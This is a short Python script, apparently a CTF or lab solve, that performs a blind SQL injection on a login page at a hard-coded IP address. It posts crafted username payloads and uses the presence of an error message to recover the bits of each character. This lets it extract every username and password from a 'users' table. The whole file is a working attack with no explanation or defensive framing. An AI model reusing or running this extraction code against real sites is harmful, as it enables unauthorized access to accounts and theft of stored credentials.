from requests import post 
import binascii

url = "http://34.143.158.202:4111/index.php?page=login"
columns = []
FALSE_MESSAGE = "username or password not match"

def binToChar(bin):
	return chr(int(bin, 2))
	
NULL = binToChar("00000000")
WTF = binToChar("1111111")

def run():
	for outerOffset in range(1, 1000):
		columnName = ""
		for nameIndex in range(1, 10000):
			charBin = ""
			binLength = 7
			payload = "' or length(convert(bin(ascii(substring((SELECT concat(username,'|',password) FROM users LIMIT {0},1),{1},1))), char)) = 6-- -".format(outerOffset, nameIndex)
			r = post(url, data={
					"username": payload,
					"password": "aaaa",
					"remember": "1"
					})
			if FALSE_MESSAGE in r.text:
				binLength = 8
			for binaryIndex in range(1, binLength):#1->binLength-1
				payload = "' or substring(bin(ascii(substring((SELECT concat(username,'|',password) FROM users LIMIT {0},1),{1},1))),{2},1) = 0-- -".format(outerOffset, nameIndex, binaryIndex)
				# print(payload)
				r = post(url, data={
					"username": payload,
					"password": "aaaa",
					"remember": "1"
					})
				if FALSE_MESSAGE in r.text:
					charBin = charBin + "1"
				else:
					charBin = charBin + "0"
				print(charBin)
			char = binToChar(charBin)
			charBin = ""
			if char == NULL:
				print("found user: " + columnName)
				columns.append(columnName)
				columnName = ""
				break
			if char == WTF:
				break
			print("found char: " + char)
			columnName = columnName + char
	print("result: \n" + "\n".join(columns))

run()

